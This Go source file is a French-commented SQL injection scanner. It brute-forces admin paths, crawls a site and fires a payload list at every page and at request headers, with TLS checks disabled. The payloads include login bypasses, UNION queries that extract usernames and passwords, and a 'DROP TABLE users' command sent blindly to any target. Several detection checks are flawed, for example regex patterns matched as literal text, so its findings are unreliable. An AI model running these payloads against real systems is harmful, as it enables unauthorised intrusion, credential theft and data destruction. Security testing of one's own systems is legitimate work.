package main

import (
    "flag"
    "fmt"
    "log"
    "os"
    "time"
    "net/http"
    "sync"
    "strings"
    "net/url"
    "io/ioutil"
    "encoding/json"
    "bufio"
    "bytes"
    "crypto/tls"
    "github.com/PuerkitoBio/goquery"
    "github.com/gocolly/colly/v2"
    "github.com/fatih/color"
    "github.com/schollz/progressbar/v3"
    
)

var banner = `
                                        
   _____ ____    __       _____ _________    _   __
  / ___// __ \  / /      / ___// ____/   |  / | / /
  \__ \/ / / / / /       \__ \/ /   / /| | /  |/ / 
 ___/ / /_/ / / /___    ___/ / /___/ ___ |/ /|  /  
/____/\___\_\/_____/   /____/\____/_/  |_/_/ |_/   
 
v1.0 - Injection SQL Vulneribility Scanner
`


// Structure principale pour la configuration
type Config struct {
    Concurrent     int
    Timeout        time.Duration
    MaxDepth       int
    RateLimit      time.Duration
    LogFile        string
    OutputFormat   string
    FollowRedirect bool
    StartTime      time.Time
}

// Structure pour les résultats du scan
type ScanResult struct {
    URL           string
    Vulnerable    bool
    Payload       string
    Error         string
    ResponseTime  float64
    StatusCode    int
    Timestamp     time.Time
    ErrorDetails  []string
    FormFields    []string
    RiskLevel     string
    FixExample    string
    ResponseLen   int
}

// Structure principale du scanner
type Scanner struct {
    BaseURL     string
    Config      *Config
    Results     []ScanResult
    Pages       map[string]bool
    Logger      *log.Logger
    mutex       sync.RWMutex
    crawler     *colly.Collector
    sqlScanner  *SQLScanner
    bar         *progressbar.ProgressBar
}

// Structure pour le scanner SQL
type SQLScanner struct {
    payloads      []string
    errorPatterns []string
    client        *http.Client
}

var sensitivePaths = []string{
    "/admin/index.php",
    "/admin/login.php",
    "/admin/admin.php",
    "/administrator/index.php",
    "/administrator/login.php",
    "/login/admin/index.php",
    "/login/admin.php",
    "/login/administrator/index.php",
    "/wp-admin/index.php",
    "/wp-login.php",
    "/phpmyadmin/index.php",
    "/phpMyAdmin/index.php",
    "/mysql/index.php",
    "/admin/dashboard.php",
    "/admin/dashboard/index.php",
    "/admin/panel/index.php",
    "/adminpanel/index.php",
    "/cpanel/index.php",
    "/user/admin/index.php",
    "/backend/index.php",
    "/admin/backend/index.php",
    "/manage/index.php",
    "/management/index.php",
    "/control/index.php",
    "/member/admin/index.php",
    "/moderator/index.php",
    "/webadmin/index.php",
    "/adminarea/index.php",
    "/bb-admin/index.php",
    "/adminLogin/index.php",
    "/admin_area/index.php",
    "/panel-administracion/index.php",
    "/instadmin/index.php",
    "/memberadmin/index.php",
    "/administratorlogin/index.php",
    "/modules/admin/index.php",
    "/administrators/index.php",
    "/siteadmin/index.php",
    "/siteadmin/login.php",
    "/admin/login/index.php",
    "/test/index.php",
}

// Extension des chemins avec différentes extensions
func generateExtendedPaths(paths []string) []string {
    extensions := []string{"", ".php", ".html", ".asp", ".aspx", ".jsp", ".action", ".do"}
    directories := []string{
        "/admin", "/administrator", "/login", "/backend", "/manage",
        "/control", "/panel", "/webadmin", "/adminpanel", "/moderator",
        "/user", "/account", "/member", "/members", "/setup",
    }

    var extendedPaths []string

    // Ajouter les chemins sensibles directs
    extendedPaths = append(extendedPaths, sensitivePaths...)

    // Générer des combinaisons
    for _, dir := range directories {
        for _, ext := range extensions {
            extendedPaths = append(extendedPaths, dir+ext)
            extendedPaths = append(extendedPaths, dir+"/index"+ext)
            extendedPaths = append(extendedPaths, dir+"/login"+ext)
            extendedPaths = append(extendedPaths, dir+"/admin"+ext)
            extendedPaths = append(extendedPaths, dir+"/main"+ext)
        }

        // Ajouter des sous-répertoires communs
        subDirs := []string{"/admin", "/user", "/manage", "/control", "/panel"}
        for _, subDir := range subDirs {
            for _, ext := range extensions {
                extendedPaths = append(extendedPaths, dir+subDir+ext)
                extendedPaths = append(extendedPaths, dir+subDir+"/index"+ext)
                extendedPaths = append(extendedPaths, dir+subDir+"/login"+ext)
            }
        }
    }

    return extendedPaths
}

// Liste complète des payloads SQL
var sqlPayloads = []string{
    "'",
    "' OR '1'='1",
    "1' OR '1' = '1",
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    "admin' --",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
    "') OR ('1'='1",
    "1; DROP TABLE users--",
    "1' AND 1=1--",
    "' OR 'x'='x",
    "' AND id IS NULL; --",
    "' UNION ALL SELECT @@version --",
    "' HAVING 1=1--",
    "' GROUP BY columnnames having 1=1--",
    "' OR 'one'='one",
    "' OR 1 in (SELECT @@version)--",
    "' OR 1=1 LIMIT 1--",
    "admin' OR '1'='1'#",
    "' UNION SELECT NULL,NULL,CONCAT(login,':',password),NULL FROM users--",
    "' AND 1=(SELECT COUNT(*) FROM tabname); --",
    "1 UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' OR '1' = '1' /* ",
    "' OR 'x'='x' #",
    "/**/SELECT/**/",
    "' UnIoN SeLeCt ",
    // Payloads spécifiques par type de base de données
    "' OR pg_sleep(5)--", // PostgreSQL
    "' OR IF(1=1, SLEEP(5), 0)--", // MySQL
    "' WAITFOR DELAY '00:00:05'--", // MSSQL
    // Payloads pour bypass d'authentification
    "' OR 1=1--",
    "admin'--",
    "admin' #",
    "admin'/*",
    // Payloads d'extraction de données
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT user(),database()--",
    // Payloads basés sur le temps
    "' OR IF(1=1, SLEEP(5), 0)--",
    "' OR pg_sleep(5)--",
    // Payloads avec encodage (hex, base64)
    "0x31", // Hex
    "0x31' OR '1'='1",
    "0x31' OR 1=1--",
    "0x31 UNION SELECT NULL--",
    "ZGV2", // Base64
    "ZGV2' OR '1'='1",
    "ZGV2' OR 1=1--",
    "ZGV2 UNION SELECT NULL--",
}

// Liste des patterns d'erreur SQL
var sqlErrorPatterns = []string{
    "SQL syntax",
    "mysql_fetch",
    "MySQLSyntaxErrorException",
    "valid MySQL result",
    "mysqli_fetch_array",
    "ORA-01756",
    "SQLite/JDBCDriver",
    "System.Data.SQLClient.SqlException",
    "Microsoft SQL Native Client error",
    "ODBC Driver",
    "PostgreSQL",
    "Npgsql",
    "PG::Error",
    "PSQLException",
    "ORA-",
    "MySQL server version",
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "SQL syntax.*MySQL",
    "Warning.*mysql_.*",
    "PostgreSQL.*ERROR",
    "Warning.*pg_.*",
    "valid PostgreSQL result",
    "Oracle.*ORA-[0-9]",
    // Ajouter plus de patterns de détection d'erreur SQL
    "unterminated quoted string",
    "quoted string not properly terminated",
    "unexpected end of SQL command",
    "incorrect syntax near",
    "syntax error, unexpected",
    "SQLSTATE[HY000]",
    "SQLSTATE[42000]",
    "SQLSTATE[42S02]",
    "SQLSTATE[42S22]",
}

// Initialisation du Scanner SQL
func NewSQLScanner(timeout time.Duration) *SQLScanner {
    return &SQLScanner{
        payloads:      sqlPayloads,
        errorPatterns: sqlErrorPatterns,
        client: &http.Client{
            Timeout: timeout,
            Transport: &http.Transport{
                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
            },
        },
    }
}

// Test d'une URL spécifique
func (s *SQLScanner) TestURL(targetURL string, payload string) (*ScanResult, error) {
    start := time.Now()

    parsedURL, err := url.Parse(targetURL)
    if err != nil {
        return nil, err
    }

    q := parsedURL.Query()
    for key := range q {
        q.Set(key, payload)
    }
    if len(q) == 0 {
        q.Set("id", payload)
    }
    parsedURL.RawQuery = q.Encode()

    req, err := http.NewRequest("GET", parsedURL.String(), nil)
    if err != nil {
        return nil, err
    }

    // Tester les en-têtes HTTP
    req.Header.Set("User-Agent", payload)
    req.Header.Set("Referer", payload)

    resp, err := s.client.Do(req)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        return nil, err
    }

    duration := time.Since(start).Seconds()
    bodyStr := string(body)

    var errorDetails []string
    isVulnerable := false

    for _, pattern := range s.errorPatterns {
        if strings.Contains(bodyStr, pattern) {
            isVulnerable = true
            errorDetails = append(errorDetails, fmt.Sprintf("Pattern trouvé: %s", pattern))
        }
    }

    if resp.StatusCode == 500 {
        isVulnerable = true
        errorDetails = append(errorDetails, "Erreur serveur 500 détectée")
    }

    if duration > 5.0 {
        errorDetails = append(errorDetails, "Temps de réponse anormal détecté")
    }

    // Analyse des changements dans le DOM
    doc, err := goquery.NewDocumentFromReader(bytes.NewReader(body))
    if err != nil {
        return nil, err
    }
    domChanges := doc.Find("script, style, iframe, object, embed, link").Length()
    if domChanges > 0 {
        errorDetails = append(errorDetails, fmt.Sprintf("Changements dans le DOM détectés: %d éléments", domChanges))
    }

    return &ScanResult{
        URL:          targetURL,
        Vulnerable:   isVulnerable,
        Payload:      payload,
        ResponseTime: duration,
        StatusCode:   resp.StatusCode,
        Timestamp:    time.Now(),
        ErrorDetails: errorDetails,
        ResponseLen:  len(body),
    }, nil
}

// Initialisation du Scanner principal
func NewScanner(baseURL string) *Scanner {
    config := &Config{
        Concurrent:     20,
        Timeout:        10 * time.Second,
        MaxDepth:       5,
        RateLimit:      time.Millisecond * 100,
        LogFile:        "sqlscan.log",
        OutputFormat:   "json",
        FollowRedirect: true,
        StartTime:      time.Now(),
    }

    c := colly.NewCollector(
        colly.MaxDepth(config.MaxDepth),
        colly.Async(true),
    )
    c.Limit(&colly.LimitRule{
        DomainGlob:  "*",
        Parallelism: config.Concurrent,
        Delay:       config.RateLimit,
    })

    logFile, err := os.OpenFile(config.LogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        log.Fatal(err)
    }
    logger := log.New(logFile, "", log.LstdFlags)

    return &Scanner{
        BaseURL:    baseURL,
        Config:     config,
        Pages:      make(map[string]bool),
        Logger:     logger,
        crawler:    c,
        sqlScanner: NewSQLScanner(config.Timeout),
    }
}

// Chargement d'une wordlist depuis GitHub
func loadWordlist() ([]string, error) {
    wordlistURL := "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt"

    resp, err := http.Get(wordlistURL)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    var paths []string
    scanner := bufio.NewScanner(resp.Body)
    for scanner.Scan() {
        paths = append(paths, scanner.Text())
    }

    return paths, scanner.Err()
}

func (s *Scanner) scanPaths() error {
    color.Yellow("\n[*] Chargement des chemins à tester...")

    // Charger la wordlist de base
    paths, err := loadWordlist()
    if err != nil {
        return fmt.Errorf("erreur chargement wordlist: %v", err)
    }

    // Générer les chemins étendus
    extendedPaths := generateExtendedPaths(paths)
    paths = append(paths, extendedPaths...)

    color.Yellow("[*] Total des chemins à tester: %d", len(paths))

    bar := progressbar.Default(int64(len(paths)))
    var wg sync.WaitGroup
    sem := make(chan bool, s.Config.Concurrent)

    for _, path := range paths {
        wg.Add(1)
        sem <- true

        go func(p string) {
            defer wg.Done()
            defer func() { <-sem }()
            fullURL := s.BaseURL + p
            req, err := http.NewRequest("GET", fullURL, nil)
            if err != nil {
                bar.Add(1)
                return
            }

            // Tester les cookies
            req.AddCookie(&http.Cookie{Name: "test", Value: "test"})

            resp, err := http.DefaultClient.Do(req)
            if err != nil {
                bar.Add(1)
                return
            }
            defer resp.Body.Close()

            // Vérifier les codes de statut intéressants
            if resp.StatusCode == 200 || resp.StatusCode == 403 || resp.StatusCode == 401 {
                s.mutex.Lock()
                s.Pages[fullURL] = true
                s.mutex.Unlock()

                statusColor := color.FgGreen
                if resp.StatusCode == 403 || resp.StatusCode == 401 {
                    statusColor = color.FgYellow
                }

                color.New(statusColor).Printf("\n[+] Page trouvée: %s (Code: %d)\n", fullURL, resp.StatusCode)
            }

            bar.Add(1)
        }(path)
    }

    wg.Wait()
    return nil
}

func (s *Scanner) Start() error {
    color.Cyan(banner)
    color.Green("[+] Initialisation du scan sur %s", s.BaseURL)

    // Scan des chemins sensibles
    if err := s.scanPaths(); err != nil {
        return fmt.Errorf("erreur scan paths: %v", err)
    }

    // Configuration du crawler pour la découverte supplémentaire
    s.crawler.OnHTML("a[href]", func(e *colly.HTMLElement) {
        link := e.Attr("href")
        absoluteURL := e.Request.AbsoluteURL(link)

        if absoluteURL != "" && strings.HasPrefix(absoluteURL, s.BaseURL) {
            s.mutex.Lock()
            if !s.Pages[absoluteURL] {
                s.Pages[absoluteURL] = true
                s.mutex.Unlock()
                e.Request.Visit(absoluteURL)
            } else {
                s.mutex.Unlock()
            }
        }
    })

    // Crawling du site
    s.crawler.Visit(s.BaseURL)
    s.crawler.Wait()

    // Exécuter les tests SQL
    return s.runSQLTests()
}

// Génération du rapport
func (s *Scanner) GenerateReport() string {
    var output strings.Builder

    color.New(color.FgGreen).Fprintln(&output, "\n=== Rapport de scan SQL ===\n")
    color.New(color.FgCyan).Fprintf(&output, "URL de base: %s\n", s.BaseURL)
    color.New(color.FgCyan).Fprintf(&output, "Pages testées: %d\n", len(s.Pages))
    color.New(color.FgCyan).Fprintf(&output, "Tests effectués: %d\n", len(s.Pages) * len(sqlPayloads))
    color.New(color.FgCyan).Fprintf(&output, "Durée du scan: %s\n", time.Since(s.Config.StartTime))
    color.New(color.FgRed).Fprintf(&output, "Vulnérabilités trouvées: %d\n\n", len(s.Results))

    for _, result := range s.Results {
        color.New(color.FgRed).Fprintf(&output, "URL vulnérable: %s\n", result.URL)
        color.New(color.FgYellow).Fprintf(&output, "Payload: %s\n", result.Payload)
        color.New(color.FgCyan).Fprintf(&output, "Code status: %d\n", result.StatusCode)
        color.New(color.FgCyan).Fprintf(&output, "Temps de réponse: %.2fs\n", result.ResponseTime)
        color.New(color.FgCyan).Fprintf(&output, "Niveau de risque: %s\n", result.RiskLevel)
        color.New(color.FgCyan).Fprintf(&output, "Exemple de correction: %s\n", result.FixExample)

        if len(result.ErrorDetails) > 0 {
            color.New(color.FgYellow).Fprintln(&output, "Détails:")
            for _, detail := range result.ErrorDetails {
                color.New(color.FgWhite).Fprintf(&output, "  - %s\n", detail)
            }
        }
        output.WriteString("---\n")
    }

    return output.String()
}

func main() {
    flag.Parse()

    if len(flag.Args()) != 1 {
        color.Red("Usage: sqlscan <url>")
        os.Exit(1)
    }

    targetURL := flag.Args()[0]
    scanner := NewScanner(targetURL)

    err := scanner.Start()
    if err != nil {
        color.Red("[!] Erreur lors du scan: %v", err)
        os.Exit(1)
    }

    // Génération et affichage du rapport
    report := scanner.GenerateReport()
    fmt.Println(report)

    // Sauvegarde du rapport dans un fichier
    /*
    reportPath := fmt.Sprintf("report_%s.txt", time.Now().Format("20060102_150405"))
    err = ioutil.WriteFile(reportPath, []byte(report), 0644)
    if err != nil {
        color.Red("[!] Erreur lors de la sauvegarde du rapport: %v", err)
    } else {
        color.Green("[+] Rapport sauvegardé dans: %s", reportPath)
    }*/

    // Affichage des statistiques finales
    color.Yellow("\nStatistiques finales:")
    color.Yellow("- Durée totale: %s", time.Since(scanner.Config.StartTime))
    color.Yellow("- Pages scannées: %d", len(scanner.Pages))
    color.Yellow("- Tests d'injection effectués: %d", len(scanner.Pages)*len(sqlPayloads))
    color.Yellow("- Vulnérabilités trouvées: %d", len(scanner.Results))

    // Si des vulnérabilités ont été trouvées, créer aussi un rapport JSON
    if len(scanner.Results) > 0 {
        jsonReport := struct {
            Timestamp    time.Time     `json:"timestamp"`
            Target       string        `json:"target"`
            Duration     string        `json:"duration"`
            PagesScanned int           `json:"pages_scanned"`
            TestsRun     int           `json:"tests_run"`
            Vulnerabilities []ScanResult `json:"vulnerabilities"`
        }{
            Timestamp:    time.Now(),
            Target:       targetURL,
            Duration:     time.Since(scanner.Config.StartTime).String(),
            PagesScanned: len(scanner.Pages),
            TestsRun:     len(scanner.Pages) * len(sqlPayloads),
            Vulnerabilities: scanner.Results,
        }

        jsonData, err := json.MarshalIndent(jsonReport, "", "    ")
        if err == nil {
            jsonPath := fmt.Sprintf("report_%s.json", time.Now().Format("20060102_150405"))
            if err := ioutil.WriteFile(jsonPath, jsonData, 0644); err == nil {
                color.Green("[+] Rapport JSON sauvegardé dans: %s", jsonPath)
            }
        }
    }

    // Suggestions de sécurité si des vulnérabilités sont trouvées
    if len(scanner.Results) > 0 {
        color.Red("\n[!] Des vulnérabilités ont été trouvées. Suggestions de sécurité:")
        color.Yellow("1. Utilisez des requêtes préparées ou des ORM")
        color.Yellow("2. Validez et assainissez toutes les entrées utilisateur")
        color.Yellow("3. Appliquez le principe du moindre privilège pour les utilisateurs de la base de données")
        color.Yellow("4. Activez le pare-feu applicatif web (WAF)")
        color.Yellow("5. Surveillez les journaux de la base de données")
    }

    // Message de fin
    if len(scanner.Results) == 0 {
        color.Green("\n[+] Aucune vulnérabilité SQL n'a été détectée!")
    } else {
        color.Red("\n[!] Le scan est terminé. Veuillez examiner le rapport pour plus de détails.")
    }

    // Nettoyage
    if err := scanner.Logger.Writer().(*os.File).Close(); err != nil {
        color.Red("[!] Erreur lors de la fermeture du fichier de log: %v", err)
    }
}

func (s *Scanner) runSQLTests() error {
    color.Green("\n[+] Début des tests d'injection SQL")
    color.Yellow("[*] Test des %d pages découvertes avec %d payloads", len(s.Pages), len(sqlPayloads))

    bar := progressbar.Default(int64(len(s.Pages) * len(sqlPayloads)))

    var wg sync.WaitGroup
    sem := make(chan bool, s.Config.Concurrent)

    for page := range s.Pages {
        // Vérification si la page contient des paramètres GET
        parsedURL, err := url.Parse(page)
        if err != nil {
            continue
        }

        // Si l'URL n'a pas de paramètres, on ajoute un paramètre 'id' test
        hasParams := len(parsedURL.Query()) > 0

        for _, payload := range sqlPayloads {
            wg.Add(1)
            sem <- true

            go func(p string, payload string, hasParams bool) {
                defer wg.Done()
                defer func() { <-sem }()

                // Si pas de paramètres, on teste avec un paramètre ajouté
                if !hasParams {
                    if strings.Contains(p, "?") {
                        p += "&id=1"
                    } else {
                        p += "?id=1"
                    }
                }

                result, err := s.sqlScanner.TestURL(p, payload)
                if err != nil {
                    s.Logger.Printf("Erreur test %s: %v", p, err)
                    bar.Add(1)
                    return
                }

                if result.Vulnerable {
                    s.mutex.Lock()
                    result.RiskLevel = "High"
                    result.FixExample = "Utilisez des requêtes préparées pour éviter les injections SQL."
                    s.Results = append(s.Results, *result)
                    s.mutex.Unlock()

                    color.Red("\n[!] Vulnérabilité trouvée!")
                    color.Red("    URL: %s", p)
                    color.Red("    Payload: %s", payload)
                    if len(result.ErrorDetails) > 0 {
                        color.Yellow("    Détails: %s", strings.Join(result.ErrorDetails, ", "))
                    }
                }

                bar.Add(1)
            }(page, payload, hasParams)
        }
    }

    wg.Wait()

    color.Green("\n[+] Tests d'injection SQL terminés")
    if len(s.Results) > 0 {
        color.Red("[!] %d vulnérabilités trouvées", len(s.Results))
    } else {
        color.Green("[+] Aucune vulnérabilité SQL détectée")
    }

    return nil
}
